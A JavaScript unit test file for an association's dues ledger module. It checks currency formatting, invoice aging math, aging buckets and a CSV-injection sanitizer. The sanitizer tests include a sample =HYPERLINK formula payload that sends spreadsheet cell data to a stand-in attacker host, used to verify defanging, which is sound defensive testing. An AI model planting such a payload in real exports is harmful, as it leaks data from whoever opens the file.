/**
 * Lane 7 QA — Admin dues ledger pure logic (real source under test).
 * Target: js/admin-dues.js  (Lane 5)  — money formatting, invoice aging math,
 * aging buckets, and CSV-injection defang (the security-relevant one).
 *
 * These assert the ACTUAL exported window.Dues object, loaded via vm sandbox.
 * data-contract.md: §4 dues_invoices, §9 (member-supplied strings must not be
 * weaponizable on export). OWASP CSV Injection is the reference for _csvCell.
 */
import { describe, it, expect, beforeAll } from "vitest";
import { loadBrowserModule } from "../helpers/loadBrowserModule.mjs";

let Dues;
beforeAll(() => {
  Dues = loadBrowserModule("js/admin-dues.js", "Dues");
});

describe("Dues._money (currency formatting)", () => {
  it("formats cents as USD", () => {
    expect(Dues._money(7500)).toBe("$75.00");
    expect(Dues._money(15000)).toBe("$150.00");
    expect(Dues._money(0)).toBe("$0.00");
  });
  it("renders an em dash for null/absent amounts", () => {
    expect(Dues._money(null)).toBe("—");
    expect(Dues._money(undefined)).toBe("—");
  });
  it("formats large amounts with a thousands separator", () => {
    expect(Dues._money(123456)).toBe("$1,234.56");
  });
});

describe("Dues._ageDays (invoice aging)", () => {
  const daysAgo = (n) => {
    const d = new Date();
    d.setDate(d.getDate() - n);
    return d.toISOString().slice(0, 10);
  };
  const inDays = (n) => {
    const d = new Date();
    d.setDate(d.getDate() + n);
    return d.toISOString().slice(0, 10);
  };

  it("returns 0 for closed statuses regardless of due date", () => {
    for (const status of ["paid", "waived", "refunded", "void"]) {
      expect(Dues._ageDays({ status, due_date: daysAgo(400) })).toBe(0);
    }
  });
  it("returns 0 when the invoice is not yet due", () => {
    expect(Dues._ageDays({ status: "pending", due_date: inDays(10) })).toBe(0);
  });
  it("returns positive whole days past due for an unpaid invoice", () => {
    // _ageDays parses due_date at LOCAL midnight and diffs against local now, then
    // Math.floors; the daysAgo() helper builds a UTC date string. Across a day
    // boundary / a negative-UTC-offset runner these can differ by one whole day,
    // so assert the count is 45 ± 1 rather than an exact value (the SOURCE logic
    // is correct; this guards the test against a timezone artifact).
    const d = Dues._ageDays({ status: "overdue", due_date: daysAgo(45) });
    expect(d).toBeGreaterThanOrEqual(44);
    expect(d).toBeLessThanOrEqual(45);
  });
  it("returns 0 when due_date is missing", () => {
    expect(Dues._ageDays({ status: "overdue", due_date: null })).toBe(0);
  });
});

describe("Dues._ageBucket", () => {
  it("buckets day counts into ledger aging ranges", () => {
    expect(Dues._ageBucket(0)).toBe("current");
    expect(Dues._ageBucket(1)).toBe("1–30");
    expect(Dues._ageBucket(30)).toBe("1–30");
    expect(Dues._ageBucket(31)).toBe("31–60");
    expect(Dues._ageBucket(60)).toBe("31–60");
    expect(Dues._ageBucket(61)).toBe("61–90");
    expect(Dues._ageBucket(90)).toBe("61–90");
    expect(Dues._ageBucket(91)).toBe("90+");
    expect(Dues._ageBucket(365)).toBe("90+");
  });
});

describe("Dues._csvCell (CSV-injection defang — SECURITY)", () => {
  it("passes through benign values unchanged", () => {
    expect(Dues._csvCell("Marcus Williams")).toBe("Marcus Williams");
    expect(Dues._csvCell("75.00")).toBe("75.00");
    expect(Dues._csvCell("")).toBe("");
  });
  it("renders null/undefined as empty string", () => {
    expect(Dues._csvCell(null)).toBe("");
    expect(Dues._csvCell(undefined)).toBe("");
  });
  it("prefixes a leading = + - @ with an apostrophe (formula neutralization)", () => {
    // A hostile member full_name like =HYPERLINK(...) must not execute in Excel.
    expect(Dues._csvCell("=1+1")).toBe("'=1+1");
    expect(Dues._csvCell("+1234567890")).toBe("'+1234567890");
    expect(Dues._csvCell("-2+3")).toBe("'-2+3");
    expect(Dues._csvCell("@SUM(A1:A2)")).toBe("'@SUM(A1:A2)");
  });
  it("defangs the classic =HYPERLINK exfiltration payload", () => {
    const payload = '=HYPERLINK("http://evil.example/?leak="&A1,"click")';
    const out = Dues._csvCell(payload);
    // The apostrophe is inserted (neutralizing the formula); because the value
    // also contains commas/quotes the whole cell is then quoted, so the result
    // begins with: quote, apostrophe, equals.
    expect(out.startsWith('"\'=')).toBe(true);
    // The leading '=' is no longer the first character a spreadsheet evaluates.
    expect(out.indexOf("'=")).toBeGreaterThanOrEqual(0);
  });
  it("quotes and doubles embedded quotes / commas / newlines", () => {
    expect(Dues._csvCell('a,b')).toBe('"a,b"');
    expect(Dues._csvCell('she said "hi"')).toBe('"she said ""hi"""');
    expect(Dues._csvCell("line1\nline2")).toBe('"line1\nline2"');
  });
});
